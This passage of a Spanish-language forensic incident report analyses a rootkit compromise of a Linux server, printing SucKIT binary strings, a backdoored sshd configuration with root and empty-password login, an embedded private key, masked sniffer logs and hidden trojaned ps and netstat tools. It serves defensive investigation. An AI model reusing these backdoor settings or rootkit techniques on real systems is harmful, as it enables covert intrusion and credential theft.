irc		6667/tcp
napster		6666/tcp
x11		6005/tcp
x11		6004/tcp
x11		6003/tcp
x11		6002/tcp
x11		6001/tcp
x11		6000/tcp
pcanywhere	5631/tcp
napster		5555/tcp
postgresql	5432/tcp
aim		5190/tcp
napster		4444/tcp
http		3128/tcp
tds		2638/tcp
mmxp		2417/tcp
cvs		2401/tcp
oracle		1526/tcp
oracle		1521/tcp
citrix		1494/tcp
tds		1433/tcp
socks		1080/tcp
smtp		587/tcp
rlogin		514/tcp
rlogin		513/tcp
rlogin		512/tcp
mmxp		417/tcp
ldap		389/tcp
telnet		261/tcp
imap		220/tcp
imap		143/tcp
smb		139/tcp
nntp		119/tcp
portmap		111/tcp
pop		110/tcp
pop		109/tcp
poppass		106/tcp
http		98/tcp
http		80/tcp
smtp		25/tcp
telnet		23/tcp
ftp		21/tcp
portmap		-111/tcp
yppasswd	100009/rpc
mountd		100005/rpc
ypserv		100004/rpc
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Es un listado de los puertos de red en los cuales \verb+dsniffer+
escuchaba. La m'aquina era espiada en todos los servicios
anteriores. \verb+dsniff+ es muy selectivo y se especializa en capturar login
y password.
 

El contenido del directorio \verb+/dev/zqft4+ es:

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
--w--w--w-    1 root     root       133730 May  9 22:00 .sniffer
-rw-r--r--    1 root     root            0 May  9 19:05 messages.hm
-rwxr-xr-x    1 root     root        28472 Apr  8 11:02 sk
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Veamos el contenido de estos archivos:

 \vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
sk: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, stripped
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Es un ejecutable con las siguientes cadenas de texto (reducidas):
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:./bin:/dev/zqft4:/dev/zqft4/bin
HOME=/dev/zqft4
HISTFILE=/dev/null
PS1=\[\033[1;30m\][\[\033[0;32m\]\u\[\033[1;32m\]@\[\033[0;32m\]\h \[\033[1;37m\]\W\
	[\033[1;30m\]]\[\033[0m\]# 
SHELL=/bin/bash
TERM=linux
pqrstuvwxyzabcde
0123456789abcdef
/dev/ptmx
/dev/pty
/dev/tty
/dev/null
/dev/null
Can't open a tty, all in use ?
Can't fork subshell, there is no way...
/dev/zqft4
/bin/sh
Can't execve shell!
BD_Init: Starting backdoor daemon...
FUCK: Can't allocate raw socket (%d)
FUCK: Can't fork child (%d)
Done, pid=%d
/dev/zqft4/.rc
use:
%s <uivfp> [args]
u       - uninstall
i       - make pid invisible
v       - make pid visible
f [0/1] - toggle file hiding
p [0/1] - toggle pid hiding
Detected version: %s
FUCK: Failed to uninstall (%d)
Suckit uninstalled sucesfully!
FUCK: Failed to hide pid %d (%d)
Pid %d is hidden now!
FUCK: Failed to unhide pid %d (%d)
Pid %d is visible now!
file
Failed to change %s hiding (%d)!
%s hiding is now %s!
kmalloc
_kmalloc
__kmalloc
/dev/zqft4
/dev/kmem
FUCK: Can't open %s for read/write (%d)
RK_Init: idt=0x%08x, 
FUCK: IDT table read failed (offset 0x%08x)
FUCK: Can't find sys_call_table[]
sct[]=0x%08x, 
FUCK: Can't find kmalloc()!
kmalloc()=0x%08x, gfp=0x%x
FUCK: Can't read syscall %d addr
Z_Init: Allocating kernel-code memory...
FUCK: Out of kernel memory!
Done, %d bytes, base=0x%08x
/dev/kmem
/dev/null
core
FUCK: Got signal %d while manipulating kernel!
/sbin/init!
0123456789abcdefghijklmnopqrstuvwxyz
0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ
<NULL>
'Yi 
/dev/null
1.3b
/dev/zqft4/.sniffer
/proc/
/proc/net/
socket:[
/sbin/init
/sbin/init!
login
telnet
rlogin
rexec
passwd
adduser
mysql
ssword:
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Este binario crea varios archivos en el disco, uno de ellos es
\verb+/dev/zqft4/.sniffer+, y corre \verb+/sbin/init+ y \verb+/sbin/init!+ Estos programas
controlan el arranque del sistema, y \verb+/sbin/init!+ no aparece en los
listados de /sbin con las herramientas propias de la m'aquina.

 El archivo \verb+messages.hm+ no contiene informaci'on relevante, y solo es
un log donde el atacante pod'ia revisar si sus acciones estaban
encubiertas.

 \verb+.sniffer+ contiene informaci'on privada que no sera mostrada en este
informe, y es aqu'i donde se almacenaba informaci'on sustra'ida de las
conexiones seguras. \verb+ssh+ y \verb+sftp+ son servicios encriptados, y un sniffer
no puede obtener informaci'on legible en texto llano sino solo la
transferencia cifrada.  En este caso los datos se recabaron antes de
que fueran cifrados y as'i se vaciaron a \verb+.sniffer+, esto indica la
usurpaci'on de las funciones de \verb+login+, \verb+ssh+ y los interpretes de
comandos como \verb+bash+.

 \verb+/dev/zqft4/.sniffer+ es el archivo mas importante en esta
investigaci'on e implica la existencia de programas troyanizados que
agregan o restan funciones a los programas usurpan. El
contenido de este archivo es de mas de dos mil l'ineas y solo se
mostraran algunas como muestra de su funci'on.

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}

/usr/bin/ssh-agent -- kde2 :
/usr/lib/telnetlogin -h host-200.77.145.198-cust.telemedia.net.mx -p :
login -h host-200.77.145.198-cust.telemedia.net.mx -p :
victima1 login: Password: xxxxxxx
/usr/lib/telnetlogin -h dup-200-64-239-90.prodigy.net.mx -p :
login -h dup-200-64-239-90.prodigy.net.mx -p :
victima1 login: Password: xxxxxxxxxxxxxxxx
/usr/lib/telnetlogin -h dup-200-64-239-90.prodigy.net.mx -p :
login -h dup-200-64-239-90.prodigy.net.mx -p :
victima1 login: 
Login timed out after 60 seconds.
/usr/lib/telnetlogin -h dup-200-64-239-90.prodigy.net.mx -p :
login -h dup-200-64-239-90.prodigy.net.mx -p :
victima1 login: Password: xxxxxxxxxxxxxxxxxxxxxxx
scp -r /var/mail xxx.xxx.xxx.xxx:/respaldo/mail/victima1/ :
/usr/bin/ssh -x -oForwardAgent no -oClearAllForwardings yes xxx.xxx.xxx.xxx scp -r -t 
/respaldo/mail/victima1/ :
The authenticity of host 'xxx.xxx.xxx.xxx (xxx.xxx.xxx.xxx)' can't be established.
RSA key fingerprint is 03:0d:65:1e:07:45:f8:fc:9d:b6:cd:87:8b:9a:23:28.
Are you sure you want to continue connecting (yes/no)? Warning: Permanently added 
'xxx.xxx.xxx.xxx' (RSA) to the list of known hosts.
/usr/lib/telnetlogin -h xxx.xxx.xxx.xxx -p :
login -h xxx.xxx.xxx.xxx -p :
victima1 login: Password: xxxxxxxxx
ssh victima2 :
xxxxxx@victima2's password: xxxxxxxx
ssh -l xxxxxx victima2 :
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
Someone could be eavesdropping on you right now (man-in-the-middle attack)!
It is also possible that the RSA host key has just been changed.
The fingerprint for the RSA key sent by the remote host is
f2:58:b8:3d:eb:a5:1e:b8:70:71:3c:83:84:3a:fa:34.
Please contact your system administrator.
Add correct host key in /home/est/xxxxxx/.ssh/known_hosts2 to get rid of this message.
Offending key in /home/est/xxxxxx/.ssh/known_hosts2:3
RSA host key for victima2 has changed and you have requested strict checking.
xxxxxx@victima2's password: xxxxxxxxxx
/usr/lib/telnetlogin -h dup-200-64-123-100.prodigy.net.mx -p :
login -h dup-200-64-123-100.prodigy.net.mx -p :
victima1 login: Password: xxxxxxxxxxxxxxxxx
/usr/lib/telnetlogin -h xxx.xxx.xxx.xxx -p :
login -h xxx.xxx.xxx.xxx -p :
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 El contenido de los archivos en \verb+/dev/rd+ es el siguiente:

\vskip 3mm 

\verb+/dev/rd/c2d3b2+


\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
# This is ssh server systemwide configuration file.

Port 56321
ListenAddress 0.0.0.0
HostKey /dev/rd/c6d0b2
RandomSeed /dev/rd/c6d3b2
ServerKeyBits 768
LoginGraceTime 600
KeyRegenerationInterval 3600
PermitRootLogin yes
IgnoreRhosts no
StrictModes yes
QuietMode yes
X11Forwarding yes
X11DisplayOffset 10
FascistLogging no
PrintMotd yes
KeepAlive yes
SyslogFacility DAEMON
RhostsAuthentication no
RhostsRSAAuthentication yes
RSAAuthentication yes
PasswordAuthentication yes
PermitEmptyPasswords yes
UseLogin no
# CheckMail no
PidFile /dev/rd/c0d0b1
# AllowHosts Lame
DenyHosts *.localhost 127.0.0.1
# Umask 022
SilentDeny yes
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Es un archivo de configuraci'on del servidor ssh, un servidor que lee
 este archivo en vez de hacerlo en \verb+/etc/ssh/+, y escucha en el puerto \verb+56321+ en
 lugar del \verb+22+. Su llave de autentificaci'on es \verb+/dev/rd/c6d0b2+, su
 semilla aleatoria de generaci'on de llaves criptogr'aficas es
 \verb+/dev/rd/c6d3b2+, y su identificador de proceso es guardado en
 \verb+/dev/rd/c0d0b1+. Adem'as no permite conexiones locales solo remotas y
 desde la direcci'on local \verb+0.0.0.0+. Su funci'on puede ser dar acceso inmediato a root a
 solicitud del atacante.


 \verb+/dev/rd/c6d0b2+ contiene:

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
SSH PRIVATE KEY FILE FORMAT 1.1
^0^0^0^0^0^0^0^0^4^0^4^0^183^21^^223^18^225^11^196^195^136^135L^222^252re^139}I^190^21^29:^204
^142^19|9^174^216^188^208^199mMb^177^229#^213^166^143-Q^202^163^222Ta^228^135^185^201^30^4O
^185_%^136r^144f^197^27^146^206d^29^207^193w^188^240^1306^234^133^209eN^193;iR^146
^158^175^165~^175^138^218*%^230)^132^18^191^172^127^230^174^7^190"uC^215c^234^251;
S^239^219^189$^215>rCP%^0^6#^0^0^0^16root@xxxbuck.com^198^207^198^207^3^252^11Uo^225
^173^212^16^^152^^255^235^30[^210^172^223F^206u^239^186^1540^190^156^177^6^21^25^131
^130r^22^173B^127^234^18S^171^170{^174^167`}^234r^241^184
}n>nZy^246^192g^129!^233#^157^201L^226[^146^254^189^144^0W^17^1379^221^217"F^224T*o
^214^215^195^169KNv^5^207^24ec^2^163jr^189pC^246b^233^1318
^241^174^233^211^184<^235^155^5O^18P^147.^176I^2^0^208M^245v^205^215VmQ^0M
^213a{k^223^169^176^165_{&0^30^4^219^151f^21^243<O^172^2483^231^208^11^^228}
^11^129$^2^153^255^243^148^168^242'^153^243^151^133F{^171^147^20J^4^2^0^208^188B
^140^28^253(^163^27^147kM^132^206w^244^2^226^130;_^201!J^216^0,^161=^129X^191^156
^172M,"^234^198^159c^161sxc\^187:V^245^24^130^221^197b%^187_^172K^235^241^219^2^0
^224^138%@h^218^194T^176AKi-^29^18^211^22%^7^3^137
?^186^211^149c.^135^137\^230/7!^217^27^213^210{^143^234l^204^157P^515^141H_?^177
^194^177i^178-^201^22e^255^0^0^0^0
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

El archivo de configuraci'on busca \verb+/dev/rd/c0d0b1+ como almac'en del
n'umero de proceso del ejecutable, solo que este archivo tiene como
propietario a root.
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
-rw-r--r--    1 root     root            5 Apr 11 15:55 c0d0b1
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

\verb+/dev/rd/c0d0b1+ contiene el n'umero de proceso de la 'ultima vez que se
ejecut'o el servidor \verb+ssh+ troyanizado:

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
6579
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm
 
La presencia de archivos que tienen como due�o a root ameritan un
an'alisis {\em post mortem}, pero antes se proceder'a a monitorear la
actividad del usuario duende en el equipo.

\subsection*{Monitoreo de actividad de los usuarios}

Se procedi'o a monitorear la actividad del usuario duende. La lista de
accesos al sistema en el mes de abril es la siguiente:

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
duende  pts/0        Sun Apr 27 20:39 - 20:40  (00:00)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 27 15:27 - 15:29  (00:01)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 27 15:19 - 15:19  (00:00)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 27 12:07 - 12:07  (00:00)     victima2.foo.bar.mx
duende  pts/0        Sun Apr 27 08:32 - 08:32  (00:00)     victima2.foo.bar.mx
duende  pts/0        Sun Apr 27 08:06 - 08:08  (00:02)     victima2.foo.bar.mx
duende  pts/3        Sat Apr 26 21:27 - 21:29  (00:01)     victima2.foo.bar.mx
duende  pts/2        Sat Apr 26 18:20 - 18:39  (00:18)     dsl-200-78-118-164.prodigy.net.mx
duende  pts/6        Fri Apr 25 21:09 - 23:21  (02:12)     victima2.foo.bar.mx
duende  pts/7        Fri Apr 25 19:04 - 19:07  (00:03)     victima2.foo.bar.mx
duende  pts/5        Fri Apr 25 14:50 - 14:55  (00:05)     victima2.foo.bar.mx
duende  pts/4        Fri Apr 25 13:19 - 13:21  (00:02)     victima2.foo.bar.mx
duende  pts/9        Fri Apr 25 11:03 - 11:06  (00:02)     victima2.foo.bar.mx
duende  pts/7        Fri Apr 25 11:02 - 11:10  (00:08)     victima2.foo.bar.mx
duende  pts/5        Fri Apr 25 08:43 - 08:45  (00:02)     victima2.foo.bar.mx
duende  pts/3        Fri Apr 25 08:27 - 08:43  (00:16)     victima2.foo.bar.mx
duende  pts/3        Fri Apr 25 08:24 - 08:25  (00:00)     victima2.foo.bar.mx
duende  pts/3        Fri Apr 25 07:19 - 08:09  (00:49)     victima2.foo.bar.mx
duende  pts/4        Fri Apr 25 07:10 - 08:10  (00:59)     victima2.foo.bar.mx
duende  pts/3        Thu Apr 24 22:05 - 22:07  (00:02)     victima2.foo.bar.mx
duende  pts/2        Thu Apr 24 16:22 - 16:24  (00:01)     victima2.foo.bar.mx
duende  pts/2        Thu Apr 24 16:17 - 16:19  (00:01)     victima2.foo.bar.mx
duende  pts/1        Thu Apr 24 13:30 - 13:30  (00:00)     victima2.foo.bar.mx
duende  pts/1        Thu Apr 24 09:49 - 09:50  (00:00)     victima2.foo.bar.mx
duende  pts/1        Thu Apr 24 07:07 - 07:08  (00:01)     victima2.foo.bar.mx
duende  pts/5        Wed Apr 23 21:23 - 21:43  (00:20)     victima2.foo.bar.mx
duende  pts/3        Wed Apr 23 20:59 - 21:02  (00:02)     victima2.foo.bar.mx
duende  pts/0        Wed Apr 23 18:14 - 18:14  (00:00)     dsl-200-67-75-152.prodigy.net.mx
duende  pts/5        Wed Apr 23 16:18 - 16:29  (00:10)     victima2.foo.bar.mx
duende  pts/5        Wed Apr 23 16:06 - 16:17  (00:11)     victima2.foo.bar.mx
duende  pts/11       Wed Apr 23 15:57 - 16:05  (00:07)     victima2.foo.bar.mx
duende  pts/2        Wed Apr 23 15:47 - 16:28  (00:41)     victima2.foo.bar.mx
duende  pts/1        Wed Apr 23 15:19 - 15:22  (00:03)     victima2.foo.bar.mx
duende  pts/2        Wed Apr 23 11:55 - 12:01  (00:05)     victima2.foo.bar.mx
duende  pts/1        Wed Apr 23 09:06 - 09:08  (00:01)     victima2.foo.bar.mx
duende  pts/2        Tue Apr 22 20:06 - 20:19  (00:13)     victima2.foo.bar.mx
duende  pts/1        Tue Apr 22 16:04 - 16:05  (00:01)     victima2.foo.bar.mx
duende  pts/1        Tue Apr 22 12:45 - 12:46  (00:01)     victima2.foo.bar.mx
duende  pts/0        Tue Apr 22 07:04 - 07:06  (00:01)     victima2.foo.bar.mx
duende  pts/1        Mon Apr 21 21:52 - 21:55  (00:02)     victima2.foo.bar.mx
duende  pts/0        Mon Apr 21 21:42 - 21:43  (00:00)     victima2.foo.bar.mx
duende  pts/1        Mon Apr 21 18:37 - 18:47  (00:09)     victima2.foo.bar.mx
duende  pts/5        Mon Apr 21 13:32 - 13:54  (00:21)     victima2.foo.bar.mx
duende  pts/2        Mon Apr 21 10:33 - 10:34  (00:00)     victima2.foo.bar.mx
duende  pts/0        Mon Apr 21 08:55 - 08:56  (00:00)     victima2.foo.bar.mx
duende  pts/0        Sun Apr 20 23:21 - 23:24  (00:02)     victima2.foo.bar.mx
duende  pts/0        Sun Apr 20 19:49 - 19:49  (00:00)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 20 16:33 - 16:34  (00:00)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 20 08:11 - 08:13  (00:02)     victima2.foo.bar.mx
duende  pts/1        Sun Apr 20 08:02 - 08:04  (00:01)     victima2.foo.bar.mx
duende  pts/1        Sat Apr 19 21:38 - 21:38  (00:00)     victima2.foo.bar.mx
duende  pts/1        Sat Apr 19 18:23 - 18:24  (00:00)     victima2.foo.bar.mx
duende  pts/2        Sat Apr 19 13:45 - 13:52  (00:07)     victima2.foo.bar.mx
duende  pts/0        Sat Apr 19 08:10 - 08:10  (00:00)     victima2.foo.bar.mx
duende  pts/0        Fri Apr 18 21:05 - 21:05  (00:00)     victima2.foo.bar.mx
duende  pts/0        Fri Apr 18 16:28 - 16:29  (00:00)     victima2.foo.bar.mx
duende  pts/0        Fri Apr 18 12:57 - 12:59  (00:01)     xxx.xxx.xxx.2
duende  pts/1        Fri Apr 18 07:02 - 07:03  (00:00)     victima2.foo.bar.mx
duende  pts/0        Thu Apr 17 22:00 - 22:03  (00:03)     victima2.foo.bar.mx
duende  pts/0        Thu Apr 17 17:59 - 18:00  (00:00)     victima2.foo.bar.mx
duende  pts/0        Thu Apr 17 13:59 - 14:00  (00:01)     victima2.foo.bar.mx
duende  pts/1        Thu Apr 17 06:54 - 06:55  (00:00)     victima2.foo.bar.mx
duende  pts/1        Wed Apr 16 21:43 - 21:44  (00:01)     victima2.foo.bar.mx
duende  pts/0        Wed Apr 16 21:42 - 21:45  (00:02)     victima2.foo.bar.mx
duende  pts/1        Wed Apr 16 18:41 - 18:43  (00:01)     victima2.foo.bar.mx
duende  pts/0        Wed Apr 16 16:30 - 16:34  (00:03)     victima2.foo.bar.mx
duende  pts/0        Wed Apr 16 16:22 - 16:26  (00:04)     victima2.foo.bar.mx
duende  pts/6        Wed Apr 16 12:11 - 12:13  (00:01)     victima2.foo.bar.mx
duende  pts/9        Wed Apr 16 07:15 - 07:30  (00:15)     victima2.foo.bar.mx
duende  pts/6        Wed Apr 16 07:05 - 07:24  (00:18)     victima2.foo.bar.mx
duende  pts/9        Tue Apr 15 20:51 - 21:04  (00:12)     victima2.foo.bar.mx
duende  pts/6        Tue Apr 15 20:48 - 21:18  (00:29)     victima2.foo.bar.mx
duende  pts/7        Tue Apr 15 18:57 - 20:48  (01:51)     victima2.foo.bar.mx
duende  pts/6        Tue Apr 15 18:55 - 20:17  (01:22)     victima2.foo.bar.mx
duende  pts/11       Tue Apr 15 16:06 - 15:14  (23:07)     victima2.foo.bar.mx
duende  pts/7        Tue Apr 15 15:59 - 18:57  (02:57)     victima2.foo.bar.mx
duende  pts/6        Tue Apr 15 15:56 - 15:59  (00:02)     victima2.foo.bar.mx

\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

La actividad de este usuario es muy alta y no hay registro de accesos
anteriores al 15 de abril, estos accesos se estudiaran mas adelante y
se cotejaran con registros de otras m'aquinas y otras cuentas.

 Hasta aqu'i es muy extra�o que los accesos de l usuario duende
provengan de \verb+victima2.foo.bar.mx+ o \verb+xxx.xxx.xxx.2+, ya que el
usuario no ten'ia restricci'on alguna para accesar directamente desde el
exterior.

 Se procedi'o a observar el comportamiento del usuario, para realizar
esto nos valimos de la colaboraci'on de algunos otros usuarios de los
servidores, quienes de com'un acuerdo nos prestaron sus cuentas para no
causar sospechas al usuario vigilado. Los colaboradores son testigos
directos en la identificaci'on primaria del atacante. La vigilancia 
del usuario se llevo a cabo por varios d'ias desde el 24
hasta el 27 de abril.
 
Una vez viendo que el usuario solo accesaba para revisar el estado
del sistema y el correcto funcionamiento de los troyanos, se procedi'o
a tratar de obligar a la m'aquina a registrar la actividad de esta
cuenta por los medios normales de registro en los archivos history,
pero el m'etodo no funciono ya que hasta este momento no se sabia que
esta cuenta no dejaba registros aun oblig'andola a hacerlo por medio
de los archivos de configuraci'on del usuario.

Se sembraron programas alternos de registro de
actividades que no son parte de las instalaciones comunes y pocos
usuarios y atacantes conocen su existencia y uso. El paquete escogido
fueron las utilidades \verb+acct+. \verb+acct+ lleva un registro independiente de
todos los comandos que se ejecutan en una m'aquina desde el momento
mismo en que se arranca el sistema.

Los resultados de acct en el servidor son los siguientes (se omiten
miles de l'ineas que se consideran innecesarias y solo se exhibe una
muestra ilustrativa):

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}

sshd              SF    500      ??         0.75 secs Sat Apr 26 18:20
tcsh                    500      ??         0.12 secs Sat Apr 26 18:20
w                  F    500      ??         0.00 secs Sat Apr 26 18:39
ssh                     500      ??         0.16 secs Sat Apr 26 18:38
ping              S     500      ??         0.01 secs Sat Apr 26 18:38
last                  X 500      ??         0.02 secs Sat Apr 26 18:37
less                    500      ??         0.04 secs Sat Apr 26 18:37
last               F    500      ??         0.00 secs Sat Apr 26 18:37
w                       500      ??         0.01 secs Sat Apr 26 18:37
df                 F    500      ??         0.00 secs Sat Apr 26 18:32
ping              S     500      ??         0.00 secs Sat Apr 26 18:32
w                  F    500      ??         0.00 secs Sat Apr 26 18:32
finger                  500      ??         0.00 secs Sat Apr 26 18:30
w                  F    500      ??         0.00 secs Sat Apr 26 18:30
lynx                    500      ??         0.20 secs Sat Apr 26 18:30
file                    500      ??         0.00 secs Sat Apr 26 18:26
ls                 F    500      ??         0.00 secs Sat Apr 26 18:26
ld                      500      ??         0.02 secs Sat Apr 26 18:26
tcsh               F    500      ??         0.00 secs Sat Apr 26 18:24
hostname           F    500      ??         0.00 secs Sat Apr 26 18:24
cons.saver        S     500      ??         0.00 secs Sat Apr 26 18:24
mc                 F    500      ??         0.00 secs Sat Apr 26 18:24
last                    500      ??         0.03 secs Sat Apr 26 18:24
ls                 F    500      ??         0.00 secs Sat Apr 26 18:24
last                  X 500      ??         0.02 secs Sat Apr 26 18:23
less                    500      ??         0.00 secs Sat Apr 26 18:23
last               F    500      ??         0.00 secs Sat Apr 26 18:23
ping              S     500      ??         0.02 secs Sat Apr 26 18:22
ls                 F    500      ??         0.00 secs Sat Apr 26 18:22
less                    500      ??         0.03 secs Sat Apr 26 18:21
ps                      500      ??         0.00 secs Sat Apr 26 18:21
sh                      500      ??         0.01 secs Sat Apr 26 18:21
egrep                   500      ??         0.00 secs Sat Apr 26 18:21
.pst                    500      ??         0.07 secs Sat Apr 26 18:21
egrep              F    500      ??         0.00 secs Sat Apr 26 18:21
ps                 F    500      ??         0.00 secs Sat Apr 26 18:21
last                  X 500      ??         0.02 secs Sat Apr 26 18:21
less                    500      ??         0.02 secs Sat Apr 26 18:21
last               F    500      ??         0.00 secs Sat Apr 26 18:21
w                  F    500      ??         0.00 secs Sat Apr 26 18:20
hostname           F    500      ??         0.00 secs Sat Apr 26 18:20
xauth                   500      ??         0.02 secs Sat Apr 26 18:20
tcsh              S     500      tty1       0.10 secs Sat Apr 26 16:07
ls                 F    500      tty1       0.00 secs Sat Apr 26 16:07
hostname           F    500      tty1       0.00 secs Sat Apr 26 16:07
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 \verb+lastcomm+ muestra el comando ejecutado, qu'ien lo ejecut'o y la hora 
de ejecuci'on entre otra informaci'on 'util. No se explicar'an en detalle estas 
l'ineas, solo se dir'a que \verb+.pst+ es un
programa oculto cuya funci'on sera explicada mas adelante. Los registros
muestran la insistencia de saber la identidad de la m'aquina por medio
del comando hostname, obtener informaci'on sobre los 'ultimos accesos y
qu'ien esta conectado en ese instante.  Cabe mencionar que antes
instalar los paquetes de registro, se provoc'o de forma intencional una
desconexi'on inesperada de los equipos por parte del administrador,
precisamente para ver cual era la reacci'on de los usuarios y echar a
funcionar los servicios sembrados. Una vez reiniciado el servidor se
vi'o seg'un los registradores que el usuario duende lo primero que hizo
fue revisar si no se hab'ia cambiado o usurpado la identidad de la
m'aquina y por consiguiente se le estaba cazando, cosa que en realidad si
se estaba haciendo como el principal sospechoso del ataque seg'un las evidencias.


Haciendo una revisi'on del disco duro en busca de archivos ocultos,
se encontraron los siguientes:

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
241477   64 -rwxr-xr-x   1 root     root        58412 Oct 27  2001 /dev/.pst
241498   92 -rwxr-xr-x   1 root     root        86892 Nov 23  2001 /dev/.nst
225715   16 -rwxr-xr-x   1 root     root        13224 Mar  2  2002 /dev/.tree
225524   32 -rwxr-xr-x   1 root     root        32236 Oct 27  2001 /dev/.tp
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 
La funci'on de estos archivos se expone a continuaci'on:
 

\verb+/dev/.pst+

 \vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim} 
.pst: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.30, 
dynamically linked (uses shared libs), stripped
 \end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Lo anterior nos dice que el archivo es un ejecutable para linux.

 Las l'ineas de texto en el archivo son:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
Linux version %d.%d.%d
Compiled with: libc %d, internal version %d.%d
libc assumed lame, using fprintf to emulate fputs.
header_gap=%d lines_to_next_header=%d
screen_cols=%d screen_rows=%d
personality=0x%08x (from "%s")
EUID=%d TTY=%d,%d Hertz=%ld
********* simple selection *********  ********* selection by list *********
-A all processes                      -C by command name
-N negate selection                   -G by real group ID (supports names)
-a all w/ tty except session leaders  -U by real user ID (supports names)
-d all except session leaders         -g by session leader OR by group name
-e all processes                      -p by process ID
T  all processes on this terminal     -s processes in the sessions given
a  all w/ tty, including other users  -t by tty
g  all, even group leaders!           -u by effective user ID (supports names)
r  only running processes             U  processes for specified users
x  processes w/o controlling ttys     t  by tty
*********** output format **********  *********** long options ***********
-o,o user-defined  -f full            --Group --User --pid --cols
-j,j job control   s  signal          --group --user --sid --rows
-O,O preloaded -o  v  virtual memory  --cumulative --format --deselect
-l,l long          u  user-oriented   --sort --tty --forest --version
                   X  registers       --heading --no-heading
                    ********* misc options *********
-V,V show version       L  list format codes  f  ASCII art forest
-m,m show threads       S  children in sum    -y change -l format
-n,N set namelist file  c  true command name  n  numeric WCHAN,UID
-w,w wide output        e  show environment   -H process heirarchy
Process selection options conflict.
Internal error in ps! Please report this bug.
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

Estas l'ineas muestran que el programa es en realidad \verb+ps+, un programa
que muestra los procesos que esta corriendo la m'aquina en determinado
momento as'i como qu'ien los ejecut'o.



\verb+/dev/.nst+

\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
.nst: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), for GNU/Linux 2.0.30, 
dynamically linked (uses shared libs), stripped
\end{verbatim}
}
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
\vskip 3mm

 Cadenas de texto en este programa:
 
\vskip 3mm
\centerline {------------------------------------------------------------------------------------------------------------------------------------}
{\footnotesize
\begin{verbatim}
net-tools 1.60
netstat 1.42 (2001-04-15)
Fred Baumgarten, Alan Cox, Bernd Eckenfels, Phil Blundell, Tuan Hoang and others
usage: netstat [-veenNcCF] [<Af>] -r         netstat {-V|--version|-h|--help}
       netstat [-vnNcaeol] [<Socket> ...]
       netstat { [-veenNac] -i | [-cnNe] -M | -s }
        -r, --route              display routing table
        -i, --interfaces         display interface table
        -g, --groups             display multicast group memberships
        -s, --statistics         display networking statistics (like SNMP)
        -M, --masquerade         display masqueraded connections
        -v, --verbose            be verbose
        -n, --numeric            don't resolve names
        --numeric-hosts          don't resolve host names
        --numeric-ports          don't resolve port names
        --numeric-users          don't resolve user names
        -N, --symbolic           resolve hardware names
        -e, --extend             display other/more information
        -p, --programs           display PID/Program name for sockets
        -c, --continuous         continuous listing
        -l, --listening          display listening server sockets
        -a, --all, --listening   display all sockets (default: connected)
        -o, --timers             display timers
        -F, --fib                display Forwarding Information Base (default)
        -C, --cache              display routing cache instead of FIB
